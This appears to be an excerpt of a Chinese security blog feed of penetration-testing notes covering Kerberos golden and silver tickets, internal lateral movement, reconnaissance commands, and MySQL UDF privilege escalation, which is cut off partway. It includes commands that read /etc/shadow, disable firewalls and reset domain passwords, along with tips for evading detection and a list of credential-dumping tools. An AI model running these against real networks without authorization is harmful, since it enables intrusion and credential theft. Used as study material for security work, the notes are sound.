src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751709-c9690fe7-9aa1-496e-a887-bcda39fba3c3.png" class="" title="Kerberos认证过程"><p>当Client想要访问Server上的某个服务时</p><ul><li>首先向AS证明自己的身份，AS认证通过发放TGT给Client，</li><li>然后Client拿着TGT向TGS发起认证请求，认证通过返还一个ST给Client</li><li>最后Client拿着ST去访问server</li></ul><h3 id="Client-与-AS-的交互"><a href="#Client-与-AS-的交互" class="headerlink" title="Client 与 AS 的交互"></a>Client 与 AS 的交互</h3><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751711-e3540feb-e69f-4590-bb13-2c04c05c3a12.png" alt="img"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751711-e3540feb-e69f-4590-bb13-2c04c05c3a12.png" class="" title="Client 与 AS 的交互"><h4 id="客户端请求-KRB-AS-REQ"><a href="#客户端请求-KRB-AS-REQ" class="headerlink" title="客户端请求 :KRB_AS_REQ:"></a>客户端请求 :KRB_AS_REQ:</h4><p>Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client NTML Hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h4 id="AS相应-KBR-AS-REP"><a href="#AS相应-KBR-AS-REP" class="headerlink" title="AS相应 :KBR_AS_REP:"></a>AS相应 :KBR_AS_REP:</h4><p>当 AS 接受到 Client的请求后，向AD发起请求，通过AD获取密码Hash并且验证信息。验证成功后生成一个由Client Hash加密的<code>Session Key as</code>和使用域特定账户<code>krbtgt </code>Hash加密的TGT（包含了<code>session key as</code>,超时时间等信息）返回给cilent客户端。</p><p>kerberos 第一步请求完成。</p><h3 id="Client-与-TGS-的交互"><a href="#Client-与-TGS-的交互" class="headerlink" title="Client 与 TGS 的交互"></a>Client 与 TGS 的交互</h3><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751725-e42a009b-2037-4e56-a84e-a6ca5019c60b.png" alt="img"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751725-e42a009b-2037-4e56-a84e-a6ca5019c60b.png" class="" title="Client 与 TGS 的交互"><h4 id="客户端请求-KBR-TGS-REQ"><a href="#客户端请求-KBR-TGS-REQ" class="headerlink" title="客户端请求: KBR_TGS_REQ:"></a>客户端请求: KBR_TGS_REQ:</h4><p>client接收到as返回的<code>KBR_AS_REP</code>:，使用自身的hash解密第一部分得到<code>Session Key as</code>,由于不知道krbtgt的Hash，因此TGT无法解密。使用得到的<code>Session-Key as</code> 加密数据(<code>timestamp</code>、<code>Client-info</code>、<code>Server-info</code>)作为一部分，然后把无法解密的TGT做为第二部分组成<code>KBR_TGS_REQ</code>发送给TGS。</p><h4 id="TGS响应-KBR-TGS-REP"><a href="#TGS响应-KBR-TGS-REP" class="headerlink" title="TGS响应: KBR_TGS-REP:"></a>TGS响应: KBR_TGS-REP:</h4><p>TGS 收到 Client 发送过来的 TGT 和 <code>Session key-as </code>加密的数据（<code>timestamp</code>、<code>Client-info</code>、<code>Server-info</code>）后，使用krbtgt的hash解密TGT，得到<code>Session-key as</code>等信息，然后拿着<code>Session-key as</code>去解密第一部分，TGA将两部分中的时间戳，客户端等信息进行比较，如果认证都通过，发送<code>KBR_TGS-REP</code>给Client。</p><p>KBR_TGS-REP由二部分组成，</p><ul><li>第一部分是由<code>Session-key as</code>加密的<code>Session-key tgs</code></li><li>第二部分是ST（由Server NTLM-hash加密的<code>Session-key tgs</code>、<code>timestamp</code>、<code>Client-info</code>）</li></ul><p>kerberos第二步请求完成。</p><h3 id="Client-与-Server-的交互"><a href="#Client-与-Server-的交互" class="headerlink" title="Client 与 Server 的交互"></a>Client 与 Server 的交互</h3><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751730-9c51198a-073a-4e02-8232-f402e0ffb228.png" alt="img"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751730-9c51198a-073a-4e02-8232-f402e0ffb228.png" class="" title="Client 与 Server 的交互"><p>client接收到TGS返回的<code>KBR_TGS-REP</code>，首先使用<code>Sessions-key as</code>解密第一部分得到<code>Session-key tgs</code>，由于不知道Server NTML hash因此第二部分无法解密。</p><h4 id="客户端向服务器请求-KRB-AP-REQ："><a href="#客户端向服务器请求-KRB-AP-REQ：" class="headerlink" title="客户端向服务器请求 KRB_AP_REQ："></a>客户端向服务器请求 KRB_AP_REQ：</h4><p>client使用得到的Session-key tgs对timetamp、Client-info、Server-info信息进行加密得到第一部分，ST做为第二部分发送给server。</p><h4 id="客服务器返回-KRB-AP-REP："><a href="#客服务器返回-KRB-AP-REP：" class="headerlink" title="客服务器返回 KRB_AP_REP："></a>客服务器返回 KRB_AP_REP：</h4><p>server收到client发送的KRB_AP_REQ，使用自身的server NTML-hash解密ST，得到Session-key tgs，再使用Session-key tgs解密第一部分，然后对两部分的内容进行比较。验证通过后发送KRB_AP_REP给client，两者建立通信。</p><p>kerberos第三步请求完成。</p><h1 id="0x02-黄金票据"><a href="#0x02-黄金票据" class="headerlink" title="0x02 黄金票据"></a>0x02 黄金票据</h1><p>用于拿下域控主机后的权限维持，krbtgt 账户的密码基本不会更改。</p><p>Client通过了第一次AS认证后，返回给TGT用于第二次认证，通过伪造TGT跳过AS认证，直接进行第二次认证，从而和任意server进行通信。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><ul><li><p>kerberos第二次认证发送的KBR_TGS_REQ由二部分组成：Session-Key as 加密数据(timestamp、Client-info、Server-info)和TGT</p></li><li><p>TGS并没有保存Session-Key as的值，因此可以随意构造Session-Key as，再利用krbtgt 用户的Hash对TGT进行伪造。</p></li></ul><h2 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h2><ul><li>域名称</li><li>域的 SID</li><li>域的krbtgt账户的密码 hash 值</li><li>伪造的用户名，可以是任意用户，通常是administrator</li></ul><h2 id="黄金票据防御"><a href="#黄金票据防御" class="headerlink" title="黄金票据防御"></a>黄金票据防御</h2><ul><li>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li><li>禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li></ul><h1 id="0x03-白银票据"><a href="#0x03-白银票据" class="headerlink" title="0x03 白银票据"></a>0x03 白银票据</h1><p>学习完黄金票据，再学习白银票据。</p><p>第二次认证返回ST给client，通过对ST进行伪造，跳过和client和KDC的前二次认证过程，直接与server进行认证。</p><h2 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>在第三次认证中，Client会向Server发送KRB_AP_REQ，包括两部分：</p><ul><li><p>第一部分：Session key tgs 加密的 Client-info、timestamp 等信息</p></li><li><p>第二部分：ST(ticket)：由Server NTLM-hash加密的数据(Session-key tgs、timestamp、Client-info)</p></li></ul><p>因此，在知道Server NTLM-hash的情况下可以对ST进行伪造，server并没有保持Session key tgs，因此可以随意伪造Session key tgs。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul><li>域名称</li><li>域的 SID</li><li>域中Server服务器账户的NTLM-Hash</li><li>伪造的用户名(可以是任意的)</li></ul><p>用于拿下一台域内主机后的权限维持</p><h1 id="0x04-黄金白银票据之间的区别"><a href="#0x04-黄金白银票据之间的区别" class="headerlink" title="0x04 黄金白银票据之间的区别"></a>0x04 黄金白银票据之间的区别</h1><h4 id="访问权限不同"><a href="#访问权限不同" class="headerlink" title="访问权限不同"></a>访问权限不同</h4><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><h4 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h4><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h4 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h4><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-内网横向渗透</title>
      <link href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
      <url>/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>当你获得内网内的一台机器权限后,需要利用现有的资源尝试获取更多的凭证与权限，进而达到控制整个内网、拥有最高权限、发动 APT （高级持续性威胁攻击）等目地,这就是内网横向</p><span id="more"></span><h1 id="0x01-内网横向需要注意的点"><a href="#0x01-内网横向需要注意的点" class="headerlink" title="0x01 内网横向需要注意的点"></a>0x01 内网横向需要注意的点</h1><p>当进行内网横向攻击前，需要对可能出现的问题进行预防。</p><h2 id="权限丢失"><a href="#权限丢失" class="headerlink" title="权限丢失"></a>权限丢失</h2><p>webshell被发现，网站关站，木马后门被发现，主机改为不出网环境等。当遇到这些问题，需要做好应对措施，多方位的做好权限维持。</p><h2 id="内网防火墙与杀毒软件"><a href="#内网防火墙与杀毒软件" class="headerlink" title="内网防火墙与杀毒软件"></a>内网防火墙与杀毒软件</h2><p>内网防火墙，内网态势感知，内网流量监控，ids，ips等安全设备都会给横向攻击的开展造成很大的麻烦，应对措施有，对传输流量进行加密，修改cs流量特征，禁止大规模内网探测扫描等等。</p><h2 id="内网蜜罐主机，蜜罐系统"><a href="#内网蜜罐主机，蜜罐系统" class="headerlink" title="内网蜜罐主机，蜜罐系统"></a>内网蜜罐主机，蜜罐系统</h2><p>近年来攻防演练越来越多的防守方启用蜜罐主机，蜜罐系统，一旦蜜罐捕捉到攻击行为，并及时发现和处置，会导致权限丢失，前功尽弃。</p><h2 id="运维管理人员"><a href="#运维管理人员" class="headerlink" title="运维管理人员"></a>运维管理人员</h2><p>内网横向攻击尽可能与运维管理人员的工作时间错开，尽量避免长时间登录administrator用户，如激活guest用户登录。降低被发现的几率。</p><h1 id="0x02-内网信息收集"><a href="#0x02-内网信息收集" class="headerlink" title="0x02 内网信息收集"></a>0x02 内网信息收集</h1><p>这部分参考上篇的内网信息收集</p><h1 id="0x03-主机横向"><a href="#0x03-主机横向" class="headerlink" title="0x03 主机横向"></a>0x03 主机横向</h1><p>收集密码信息、通过rdp和ssh进行主机横向</p><h2 id="内网hash-明文密码获取"><a href="#内网hash-明文密码获取" class="headerlink" title="内网hash&#x2F;明文密码获取"></a>内网hash&#x2F;明文密码获取</h2><ul><li>mimikatz抓取当前主机用户的hash密码</li><li>获取rdp连接保存的密码<br>    <code>shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code></li></ul><h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p>pth，指Pass-The-Hash，当目标机系统&gt;&#x3D;win server 2012时，无法通过lsass.exe进程中是抓取明文密码，且随着信息安全意识的提高，弱口令越来越少，经常会遇到拿到hash却解不开的情况。</p><ul><li>cs&#x2F;msf&#x2F;impacket_smbexec</li><li>pth登录远程rdp</li><li>rdp劫持</li></ul><h1 id="0x03-未授权访问横向"><a href="#0x03-未授权访问横向" class="headerlink" title="0x03 未授权访问横向"></a>0x03 未授权访问横向</h1><p>默认密码为空或者不存在密码校验</p><p>常见的未授权访问服务有：</p><ul><li>Redis 未授权访问漏洞                   </li><li>MongoDB 未授权访问漏洞               </li><li>Jenkins 未授权访问漏洞 </li><li>Memcached 未授权访问漏洞</li><li>JBOSS 未授权访问漏洞</li><li>VNC 未授权访问漏洞</li><li>Docker 未授权访问漏洞</li><li>ZooKeeper 未授权访问漏洞</li><li>Rsync 未授权访问漏洞</li><li>Atlassian Crowd 未授权访问漏洞</li><li>CouchDB 未授权访问漏洞</li><li>Elasticsearch 未授权访问漏洞</li><li>Hadoop 未授权访问漏洞</li><li>Jupyter Notebook 未授权访问漏洞</li></ul><h1 id="0x04-弱口令横向"><a href="#0x04-弱口令横向" class="headerlink" title="0x04 弱口令横向"></a>0x04 弱口令横向</h1><ul><li>tomcat&#x2F;weblogic&#x2F;jboss弱口令</li><li>FTP弱口令</li><li>Telnet弱口令</li><li>Axis2<ul><li>默认账号admin密码axis2</li></ul></li></ul><h1 id="0x05-数据库横向"><a href="#0x05-数据库横向" class="headerlink" title="0x05 数据库横向"></a>0x05 数据库横向</h1><p>通过信息收集查找配置文件中数据库连接地址、账户密码信息。<br>常见的配置文件有 web.config、config.php、db.properties 等等<br>然后按照数据库存在的漏洞写shell等来进一步攻击</p><h1 id="0x06-命令执行rce"><a href="#0x06-命令执行rce" class="headerlink" title="0x06 命令执行rce"></a>0x06 命令执行rce</h1><ul><li>shiro反序列化</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 内网横向渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-内网信息收集</title>
      <link href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p> 渗透测试的本质是<strong>信息收集</strong>,内网渗透也同样如此.</p><span id="more"></span><h1 id="0x01-本机信息收集"><a href="#0x01-本机信息收集" class="headerlink" title="0x01 本机信息收集"></a>0x01 本机信息收集</h1><h2 id="收集账户信息"><a href="#收集账户信息" class="headerlink" title="收集账户信息"></a>收集账户信息</h2><p>常用命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> 当前用户<br><span class="hljs-built_in">whoami</span> /all 用户权限<br>net config workstation 登录信息<br>net user 本地用户<br>查看本机管理员 `net localgroup administrators `<br><br>linux:<br><span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h2 id="查看网络及端口信息"><a href="#查看网络及端口信息" class="headerlink" title="查看网络及端口信息"></a>查看网络及端口信息</h2><p>看网络是否出网,有无内网,或者是否存在容易攻击的网络服务或者端口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig/ifconfig 查询网络情况<br>netstat -ano 端口开放信息<br>arp -a arp信息<span class="hljs-built_in"></span><br><span class="hljs-built_in">route </span><span class="hljs-built_in">print</span> 路由信息<br>dns信息<br>hosts文件<br></code></pre></td></tr></table></figure><p>部分常见端口的协议说明和攻击思路</p><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21&#x2F;22&#x2F;69</td><td>ftp&#x2F;tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>67&#x2F;68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>445</td><td>SMB</td><td>远程代码执行</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase&#x2F;DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic</td><td>Java反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80&#x2F;443&#x2F;8080</td><td>web</td><td>常见web攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9080</td><td>websphere</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere控制台</td><td>爆破：控制台弱口令\Java反序列</td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table><h2 id="查询系统版本及补丁信息"><a href="#查询系统版本及补丁信息" class="headerlink" title="查询系统版本及补丁信息"></a>查询系统版本及补丁信息</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">win:<br>systeminfo<br>wmic qfe <span class="hljs-built_in">get</span>  Caption,description,HotfixID,installedOn <br>linux：<br>uname -<span class="hljs-keyword">a</span> <br></code></pre></td></tr></table></figure><p>根据补丁或者版本可以查看当前系统是否存在内核漏洞或者其他漏洞进行下一步攻击</p><h2 id="查看进程服务等-软件信息"><a href="#查看进程服务等-软件信息" class="headerlink" title="查看进程服务等 软件信息"></a>查看进程服务等 软件信息</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">win：<br>tasklist /v<br>查看安装的软件信息 wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br>查看服务信息 wmic service list brief``sc query``<span class="hljs-keyword">Get</span>-WmiObject win32_service | <span class="hljs-keyword">select</span> PathName<br>linux：<br>ps aux/ps -ef<br>top <br>还可以通过/proc/pid<br></code></pre></td></tr></table></figure><p>这一步主要是看是否存在容易攻击的应用进程 还可以了解有无AV </p><h2 id="查看杀软信息："><a href="#查看杀软信息：" class="headerlink" title="查看杀软信息："></a>查看杀软信息：</h2><p><code>wmic /node:localhost /namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code></p><h2 id="获取凭证密码信息"><a href="#获取凭证密码信息" class="headerlink" title="获取凭证密码信息"></a>获取凭证密码信息</h2><p>收集凭证信息可以帮助我们更好的进行测试,如密码习惯,域渗透所需凭证,远程登陆等</p><ul><li><p>工具</p><ul><li><p>Windows：</p><ul><li><p>mimikatz</p></li><li><p>wce</p></li><li><p>Invoke-WCMDump</p></li><li><p>mimiDbg</p></li><li><p>LaZagne</p></li><li><p>nirsoft_package</p></li></ul></li><li><p>Linux：</p><ul><li><p>LaZagne</p></li><li><p>mimipenguin</p></li></ul></li></ul></li><li><p>Windows： 本地密码Hash和明文密码&#x2F;抓取浏览器密码&#x2F;服务端明文密码</p></li><li><p>linux：history记录敏感操作&#x2F;shadow文件破解&#x2F;mimipenguin抓取密码&#x2F;使用Strace收集登录凭证&#x2F;全盘搜索敏感信息</p></li><li><p>Windows RDP连接记录</p></li><li><p>浏览器中保存的账号密码</p></li><li><p>系统密码管理器中的各种密码</p></li></ul><h2 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">share</span><br>wmic <span class="hljs-keyword">share</span> <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-type">path</span>,status<br></code></pre></td></tr></table></figure><h2 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh<span class="hljs-built_in"> firewall </span>show<span class="hljs-built_in"> config </span>查看防火墙配置<br>关闭防火墙 <br>netsh<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span> Windows<span class="hljs-built_in"> Server </span>2003及之前的版本<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off Windows<span class="hljs-built_in"> Server </span>2003之后的版本<br>防火墙日志目录 netsh<span class="hljs-built_in"> firewall </span>show<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span>防火墙规则 netsh advfirewall<span class="hljs-built_in"> firewall </span>show rule <span class="hljs-attribute">name</span>=all<br></code></pre></td></tr></table></figure><h2 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h2><ul><li>查询远程连接端口</li></ul> <figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">Reg query <span class="hljs-string">&quot;hkey_local_machine<span class="hljs-char escape_">\s</span>ystem<span class="hljs-char escape_">\c</span>urrentcontrolset<span class="hljs-char escape_">\c</span>ontrol<span class="hljs-char escape_">\t</span>erminal server<span class="hljs-char escape_">\w</span>instations<span class="hljs-char escape_">\R</span>DP-Tcp&quot;</span> <span class="hljs-symbol">/v</span> portnumber<br></code></pre></td></tr></table></figure><h1 id="0x02-域内信息收集"><a href="#0x02-域内信息收集" class="headerlink" title="0x02 域内信息收集"></a>0x02 域内信息收集</h1><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域:"></a>判断是否存在域:</h2><ul><li>通过主DNS后缀判断是否存在域 <code>ifconfig /all</code></li><li>查看系统的基本信息 <code>systeminfo</code></li></ul><h2 id="查看当前登陆域"><a href="#查看当前登陆域" class="headerlink" title="查看当前登陆域"></a>查看当前登陆域</h2><ul><li><code>net config workstation</code></li></ul><h2 id="查看远程登陆信息"><a href="#查看远程登陆信息" class="headerlink" title="查看远程登陆信息"></a>查看远程登陆信息</h2><ul><li><code>cmdkey /l</code></li></ul><h2 id="判断主域（定位域控）"><a href="#判断主域（定位域控）" class="headerlink" title="判断主域（定位域控）"></a>判断主域（定位域控）</h2><ul><li><p>查询时间</p><ul><li><code>net time /domain</code></li><li>原理：域服务器通常会同时作为时间服务器使用</li></ul></li><li><p>查看域控制器主机名: <code>net group &quot;domain controllers&quot; /domain</code></p></li><li><p>通过DNS服务器定位</p><ul><li>一般DNS服务器和域控是同一台服务器</li><li><code>nslookup -type=SRV_ldap_tcp</code></li></ul></li></ul><h2 id="获取域内基础信息"><a href="#获取域内基础信息" class="headerlink" title="获取域内基础信息"></a>获取域内基础信息</h2><ul><li>查询域：<code>net view /domain (存在域tide)</code></li><li>查询域内所有计算机：<code>net view /domain:域名</code></li><li>查询域内所有工作组：<code>net group /domain</code></li><li>查看所有域成员计算机列表：<code>net group &quot;domain computers&quot; /domain</code></li><li>获取域信任信息：<code>nltest /domain_trusts</code></li><li>获取域密码信息：<code>net accounts /domain</code></li></ul><h2 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h2><ul><li>查看域控机器名：<code>nltest /DCLIST:域名</code></li><li>查看域控制器组：<code>net group &quot;Domain Controllers&quot; /domain</code></li></ul><h2 id="获取域内用户和管理员信息"><a href="#获取域内用户和管理员信息" class="headerlink" title="获取域内用户和管理员信息"></a>获取域内用户和管理员信息</h2><ul><li>查询所有域用户列表：<code>net user /domain</code></li><li>获取域内用户的详细信息：<code>wmic useraccount get /all</code></li><li>查询域管理员用户组：<code>net group &quot;domain admins&quot; /domain</code></li><li>查询管理员用户组：<code>net group &quot;Enterprise Admins&quot; /domain</code></li><li>用户特权信息 <code>whoami /priv</code></li><li>查看登陆本机的域管理员 <code>net localgroup administrators /domain</code></li><li>修改域用户密码 <code>net user /domain xxx pass</code></li></ul><h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><ul><li>列出本机的所有进程及进程用户：tasklist &#x2F;v</li><li>查询域控制器列表：net group “Domain Controllers” &#x2F;domain</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 内网信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权-数据库</title>
      <link href="/2022/04/24/%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2022/04/24/%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>服务器开启数据库服务及获取到最高权限用户密码。</li><li>除 Access 数据库外，其他数据库基本都存在数据库提权的可能</li></ul><h3 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a>数据库信息收集</h3><ul><li>配置文件</li><li>存储文件</li><li>暴力破解</li><li>其他方式</li></ul><h3 id="不同数据库提权方法"><a href="#不同数据库提权方法" class="headerlink" title="不同数据库提权方法"></a>不同数据库提权方法</h3><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><h5 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h5><p><em><strong>条件：</strong></em></p><ul><li>mysql &lt; 5.0，导出路径随意。</li><li>5.0 &lt;&#x3D; mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:&#x2F;windows&#x2F;system32&#x2F;)</li><li>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</li><li>掌握mysql数据库的账户，并且的insert和delete权限，以创建和删除函数</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul><p><em><strong>使用：</strong></em></p><ol><li>把含义自定义函数（如执行系统命令函数“sys_eval”）的dll或者so文件放入特定文件夹下。</li><li>声明引入这个dll文件中的自定义函数。(linux环境下导出lib_mysqludf_sys.so，Windows下导出dll文件)<br> <code>CREATE 